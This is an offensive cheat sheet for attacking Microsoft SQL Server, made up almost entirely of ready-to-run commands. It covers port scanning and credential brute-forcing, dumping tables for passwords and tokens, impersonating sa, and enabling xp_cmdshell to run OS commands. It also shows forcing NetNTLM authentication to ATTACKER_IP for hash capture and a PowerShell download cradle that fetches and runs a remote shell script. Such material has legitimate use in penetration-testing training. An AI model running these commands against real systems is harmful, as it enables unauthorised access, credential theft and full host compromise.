# 🗄️ MSSQL Offensive Cheat Sheet

---

> [!info] 🧠 What is Microsoft SQL Server?
>
> ```bash
> Enterprise-grade relational database management system (RDBMS)
> ```
>
> 💡 Key Functions:
>
> * **Database Storage**: Stores structured application data
> * **Authentication**: Supports SQL + Windows authentication
> * **Procedural Execution**: Executes stored procedures and system commands
> * **Privilege Management**: Role-based access control
>
> ✔ Common in:
>
> * Corporate Windows environments
> * Active Directory infrastructures
> * Enterprise web applications
> * Internal business applications

---

> [!tip] 🔧 Core Idea
>
> ```bash
> Client ↔ SQL Server Instance ↔ Databases ↔ OS / Windows Service Context
> ```
>
> 💡 Default Port:
>
> * **TCP 1433** → Default MSSQL service
>
> ✔ Think of MSSQL as:
>
> **A database that often doubles as a bridge into Windows itself**

---

# 🌳 MSSQL Architecture

---

### 📄 Core Components

**SQL Server Instance**

```text
Main database engine
```

**Databases**

```text
master
msdb
model
tempdb
application databases
```

**Service Accounts**

```text
NT SERVICE\MSSQLSERVER
NT AUTHORITY\SYSTEM
Domain service accounts
```

---

### 📄 Authentication Modes

**SQL Authentication**

```text
sa / SQL logins
```

**Windows Authentication**

```text
DOMAIN\User
HOSTNAME\Administrator
```

---

# 🔍 Footprinting & Enumeration

---

> [!success] 📡 Port Discovery
>
> ```bash
> nmap -sV -p 1433 <target>
> ```
>
> Example:
>
> ```bash
> nmap -Pn -sV -sC -p1433 10.10.10.10
> ```

---

> [!success] 🔎 NSE Enumeration
>
> ```bash
> nmap --script ms-sql-info -p 1433 <target>
> nmap --script ms-sql-empty-password -p 1433 <target>
> nmap --script ms-sql-brute -p 1433 <target>
> ```

---

> [!success] 🛠️ Impacket Enumeration
>
> ```bash
> mssqlclient.py user:password@target
> ```

---

# 🔐 Authentication & Access

---

> [!info] 🔑 Common Login Methods
>
> **SQL Login**
>
> ```bash
> sqlcmd -S TARGET -U sa -P Password123
> ```
>
> **Windows Auth**
>
> ```bash
> sqlcmd -S TARGET -E
> ```

---

> [!tip] Default / Weak Credential Targets
>
> ```text
> sa
> sqladmin
> administrator
> dbadmin
> svc_sql
> test
> ```
>
> Weak passwords:
>
> ```text
> Password123
> Welcome1
> admin123
> SQL123
> ```

---

# 🛰️ Initial Recon

---

> [!success] 🧭 Identify Context
>
> ```sql
> SELECT SYSTEM_USER;
> SELECT CURRENT_USER;
> SELECT DB_NAME();
> SELECT HOST_NAME();
> SELECT @@version;
> ```

---

> [!success] 👑 Check Privilege Level
>
> ```sql
> SELECT IS_SRVROLEMEMBER('sysadmin');
> ```
>
> Results:
>
> ```text
> 1 = Sysadmin
> 0 = Not Sysadmin
> ```

---

# 📂 Database Enumeration

---

> [!success] 🗃️ List Databases
>
> ```sql
> SELECT name FROM sys.databases;
> ```

---

> [!success] 📋 Switch Database
>
> ```sql
> USE database_name;
> GO
> ```

---

> [!success] 📑 List Tables
>
> ```sql
> SELECT table_name
> FROM information_schema.tables;
> ```

---

> [!success] 🧬 View Columns
>
> ```sql
> SELECT column_name, data_type
> FROM information_schema.columns
> WHERE table_name='users';
> ```

---

# 🔍 Credential Hunting

---

> [!tip] Hunt Interesting Tables
>
> ```sql
> SELECT table_name
> FROM information_schema.tables
> WHERE table_name LIKE '%user%'
> OR table_name LIKE '%account%'
> OR table_name LIKE '%auth%'
> OR table_name LIKE '%login%'
> OR table_name LIKE '%cred%';
> ```

---

> [!success] Dump Table Data
>
> ```sql
> SELECT TOP 50 * FROM users;
> ```

---

> [!warning] Look For
>
> ```text
> username
> password
> password_hash
> token
> secret
> api_key
> role
> ```

---

# 👤 Login Enumeration

---

> [!success] List Server Logins
>
> ```sql
> SELECT name, type_desc, is_disabled
> FROM sys.server_principals;
> ```

---

> [!success] Search For Users
>
> ```sql
> SELECT name
> FROM sys.server_principals
> WHERE name LIKE '%admin%';
> ```

---

> [!tip] Ignore Noise
>
> ```text
> ##MS_*
> spt_*
> MSreplication_*
> ```
>
> These are internal SQL Server objects.

---

# 👑 Privilege Escalation

---

> [!success] Enumerate Sysadmins
>
> ```sql
> EXEC sp_helpsrvrolemember 'sysadmin';
> ```

---

> [!success] Check Impersonation
>
> ```sql
> SELECT
> pe.name AS Grantee,
> pr.name AS Target
> FROM sys.server_permissions sp
> JOIN sys.server_principals pe
> ON sp.grantee_principal_id = pe.principal_id
> JOIN sys.server_principals pr
> ON sp.major_id = pr.principal_id
> WHERE sp.permission_name='IMPERSONATE';
> ```

---

> [!danger] Impersonate
>
> ```sql
> EXECUTE AS LOGIN='sa';
> SELECT SYSTEM_USER;
> ```

Revert:

```sql
REVERT;
```

---

# ⚠️ xp_cmdshell Abuse

---

> [!danger] Enable Command Execution
>
> ```sql
> EXEC sp_configure 'show advanced options',1;
> RECONFIGURE;
>
> EXEC sp_configure 'xp_cmdshell',1;
> RECONFIGURE;
> ```

---

> [!success] Verify Access
>
> ```sql
> EXEC xp_cmdshell 'whoami';
> ```

---

> [!tip] Useful Commands
>
> **Hostname**
>
> ```sql
> EXEC xp_cmdshell 'hostname';
> ```
>
> **Privileges**
>
> ```sql
> EXEC xp_cmdshell 'whoami /priv';
> ```
>
> **Users**
>
> ```sql
> EXEC xp_cmdshell 'net user';
> ```
>
> **Admins**
>
> ```sql
> EXEC xp_cmdshell 'net localgroup administrators';
> ```

---

# 📂 File Operations

---

> [!success] List Files
>
> ```sql
> EXEC xp_cmdshell 'dir C:\';
> ```

---

> [!success] Read File
>
> ```sql
> SELECT * FROM OPENROWSET(
> BULK N'C:\Windows\win.ini',
> SINGLE_CLOB
> ) AS Contents;
> ```

---

> [!danger] Write File
>
> ```sql
> EXEC xp_cmdshell 'echo owned > C:\temp\proof.txt';
> ```

---

# 🔓 NetNTLM Capture

---

> [!danger] Force SMB Authentication
>
> ```sql
> EXEC master..xp_dirtree '\\ATTACKER_IP\share';
> ```

or

```sql
EXEC master..xp_fileexist '\\ATTACKER_IP\share';
```

Listener:

```bash
sudo responder -I tun0
```

---

# 🌐 Linked Servers

---

> [!success] Enumerate
>
> ```sql
> EXEC sp_linkedservers;
> ```

---

> [!success] Query Linked Server
>
> ```sql
> SELECT * FROM OPENQUERY("SQLSERVER2",'SELECT @@version');
> ```

---

> [!danger] Execute Commands
>
> ```sql
> EXECUTE('EXEC xp_cmdshell ''whoami''') AT SQLSERVER2;
> ```

---

# ⚡ Reverse Shell

---

> [!danger] PowerShell Download Cradle
>
> ```sql
> EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"';
> ```

---

> [!danger] Encoded Payload
>
> ```sql
> EXEC xp_cmdshell 'powershell -enc BASE64PAYLOAD';
> ```

---

# 🛠️ Service Account Abuse

---

> [!success] Identify SQL Service Context
>
> ```sql
> EXEC xp_cmdshell 'whoami';
> ```

Possible outputs:

```text
nt service\mssqlserver
nt authority\system
domain\sqlsvc
```

---

> [!tip] Why It Matters
>
> If MSSQL runs as:
>
> **SYSTEM**
> → Full machine compromise
>
> **Domain service account**
> → AD lateral movement opportunities

---

# 📦 SQL Agent Jobs

---

> [!success] Enumerate Jobs
>
> ```sql
> SELECT name
> FROM msdb.dbo.sysjobs;
> ```

---

> [!success] Inspect Commands
>
> ```sql
> SELECT *
> FROM msdb.dbo.sysjobsteps;
> ```

---

# 🧠 Real-World Attack Workflow

---

> [!success] Attack Flow
>
> ```bash
> 1. Scan TCP 1433
> 2. Authenticate / brute creds
> 3. Check sysadmin
> 4. Enumerate databases
> 5. Hunt credentials
> 6. Check impersonation
> 7. Enable xp_cmdshell
> 8. OS enumeration
> 9. Pivot / reverse shell
> ```

---

# 🧩 Mental Model

---

> [!quote] 🎯 MSSQL Attack Chain
>
> ```bash
> Login → Database Access
> Database Access → Privilege Escalation
> Privilege Escalation → xp_cmdshell
> xp_cmdshell → Windows Execution
> Windows Execution → Full Host Compromise
> ```
>
> 💡 MSSQL isn’t just a database.
>
> In Windows-heavy environments, it’s often a **launchpad into the operating system itself.**
